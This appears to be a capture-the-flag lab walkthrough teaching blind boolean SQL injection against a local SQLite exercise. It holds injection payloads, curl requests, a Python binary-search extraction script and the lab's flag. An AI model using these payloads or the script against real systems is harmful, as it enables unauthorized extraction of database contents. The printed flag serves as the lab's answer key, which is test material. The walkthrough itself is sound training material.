<h4>Step 1: Test Normal Lookup</h4>
<p>Check a known username to see how the application responds.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin"<br>
        <span class="prompt">SQL: </span>SELECT id, username, is_active FROM members WHERE username = 'admin' AND is_active = 1<br><br>
        <span class="prompt">Response: </span><strong>Status: Active</strong>
    </div>
</div>

<p>An unknown username returns a different response:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1b. Unknown User</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=doesnotexist"<br>
        <span class="prompt">Response: </span><strong>Status: Not found.</strong>
    </div>
</div>

<p>Two distinct responses: "Active" vs "Not found.": this is the boolean oracle.</p>

<h4>Step 2: Confirm Injection with Boolean Conditions</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Boolean Oracle Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND 1=1 -- -"<br>
        <span class="prompt">Response: </span><strong>Status: Active</strong> (TRUE -- query still finds admin)<br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND 1=2 -- -"<br>
        <span class="prompt">Response: </span><strong>Status: Not found.</strong> (FALSE -- 1=2 fails, no result)
    </div>
</div>

<p>Injection confirmed. We can append conditions after the username and observe true/false responses.</p>

<h4>Step 3: Discover the secrets Table</h4>
<p>Use the boolean oracle to check if a <code>secrets</code> table exists via <code>sqlite_master</code>.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT count(*) FROM sqlite_master WHERE type='table' AND name='secrets')&gt;0 -- -"<br>
        <span class="prompt">Response: </span><strong>Status: Active</strong> (TRUE -- 'secrets' table exists!)
    </div>
</div>

<h4>Step 4: Determine Flag Length</h4>
<p>Binary search for the length of <code>flag_value</code> in the <code>secrets</code> table.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Flag Length</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT length(flag_value) FROM secrets LIMIT 1)&gt;20 -- -"<br>
        <span class="prompt">Response: </span><strong>Status: Active</strong> (TRUE -- length &gt; 20)<br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT length(flag_value) FROM secrets LIMIT 1)&gt;30 -- -"<br>
        <span class="prompt">Response: </span><strong>Status: Not found.</strong> (FALSE -- length &lt;= 30)<br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND (SELECT length(flag_value) FROM secrets LIMIT 1)=25 -- -"<br>
        <span class="prompt">Response: </span><strong>Status: Active</strong> (TRUE -- flag is exactly <strong>25 characters</strong>)
    </div>
</div>

<h4>Step 5: Extract Characters with substr()</h4>
<p>Test individual characters using direct comparison.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Direct substr() Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>admin' AND substr((SELECT flag_value FROM secrets LIMIT 1),1,1)='F' -- -<br>
        <span class="prompt">Response: </span>Active (TRUE -- first char is 'F')<br><br>
        <span class="prompt">Input: </span>admin' AND substr((SELECT flag_value FROM secrets LIMIT 1),2,1)='L' -- -<br>
        <span class="prompt">Response: </span>Active (TRUE -- second char is 'L')<br><br>
        <span class="prompt">Input: </span>admin' AND substr((SELECT flag_value FROM secrets LIMIT 1),1,4)='FLAG' -- -<br>
        <span class="prompt">Response: </span>Active (TRUE -- starts with 'FLAG')
    </div>
</div>

<h4>Step 6: hex(substr()) for Special Characters</h4>
<p>
    Characters like <code>{</code>, <code>}</code>, and <code>_</code> can cause quoting issues.
    Use <code>hex()</code> to compare hex values instead.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Hex Comparison</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// '{' = hex 7B</span><br>
        <span class="prompt">Input: </span>admin' AND hex(substr((SELECT flag_value FROM secrets LIMIT 1),5,1))='7B' -- -<br>
        <span class="prompt">Response: </span>Active (TRUE -- position 5 is '{' = 0x7B)<br><br>
        <span class="prompt">// '}' = hex 7D</span><br>
        <span class="prompt">Input: </span>admin' AND hex(substr((SELECT flag_value FROM secrets LIMIT 1),25,1))='7D' -- -<br>
        <span class="prompt">Response: </span>Active (TRUE -- position 25 is '}' = 0x7D)
    </div>
</div>

<h4>Step 7: Binary Search with unicode()</h4>
<p>
    Testing every character one by one is slow (~95 requests per position). Use <code>unicode()</code>
    to get the ASCII code of a character, then binary search with <code>&gt;</code> comparisons
    to find each character in ~7 requests instead.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Binary Search with unicode()</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// 'F' = ASCII 70. Binary search narrowing:</span><br>
        <span class="prompt">Input: </span>admin' AND unicode(substr((SELECT flag_value FROM secrets LIMIT 1),1,1))>79 -- -<br>
        <span class="prompt">Response: </span>Not found. (FALSE -- char &lt;= 79)<br><br>
        <span class="prompt">Input: </span>admin' AND unicode(substr((SELECT flag_value FROM secrets LIMIT 1),1,1))>69 -- -<br>
        <span class="prompt">Response: </span>Active (TRUE -- char > 69)<br><br>
        <span class="prompt">Input: </span>admin' AND unicode(substr((SELECT flag_value FROM secrets LIMIT 1),1,1))>70 -- -<br>
        <span class="prompt">Response: </span>Not found. (FALSE -- char &lt;= 70)<br><br>
        <span class="prompt">// char > 69 AND char &lt;= 70, so char = 70 = 'F'</span>
    </div>
</div>

<h4>Step 8: Automation Script</h4>
<p>Automate the full extraction with a Python binary search script.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Python Automation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 -c "<br>
import requests<br>
url = 'http://TARGET/lab.php'<br>
flag = ''<br>
for i in range(1, 30):<br>
&nbsp;&nbsp;low, high = 32, 126<br>
&nbsp;&nbsp;while low &lt;= high:<br>
&nbsp;&nbsp;&nbsp;&nbsp;mid = (low + high) // 2<br>
&nbsp;&nbsp;&nbsp;&nbsp;payload = f\"admin' AND unicode(substr((SELECT flag_value FROM secrets LIMIT 1),{i},1))>{mid} -- -\"<br>
&nbsp;&nbsp;&nbsp;&nbsp;r = requests.get(url, params={'lab':'sqlite/lab4','mode':'black','username':payload})<br>
&nbsp;&nbsp;&nbsp;&nbsp;if 'result-success' in r.text:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low = mid + 1<br>
&nbsp;&nbsp;&nbsp;&nbsp;else:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;high = mid - 1<br>
&nbsp;&nbsp;if low > 126: break<br>
&nbsp;&nbsp;flag += chr(low)<br>
&nbsp;&nbsp;print(f'[+] {flag}')<br>
print(f'Flag: {flag}')<br>
"
    </div>
</div>

<h4>Step 9: Full Extraction Result</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 9. Extracted Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Position: </span> 1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25<br>
        <span class="prompt">Char:     </span> F  L  A  G  {  s  q  _  b  l  1  n  d  _  h  3  x  _  s  u  b  s  t  r  }<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{sq_bl1nd_h3x_substr}</strong>
    </div>
</div>

<h4>Step 10: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{sq_bl1nd_h3x_substr}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Manual Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab4" \<br> --data-urlencode "username=admin' AND hex(substr((SELECT flag_value FROM secrets LIMIT 1),1,1))='46' -- -"<br><br>
        <span class="prompt"># </span>Returns "Status: Active" confirming first char = 'F' (hex 46)
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Blind boolean SQLi uses two distinct application responses as a
    true/false oracle. <code>hex(substr(value, pos, 1))</code> converts a character to its hex
    representation, avoiding quote/escape issues with special characters. Binary search with
    <code>unicode()</code> reduces requests from ~95 per character to ~7 per character (log2 of 95).
    Always use parameterized queries to prevent blind injection.
</div>
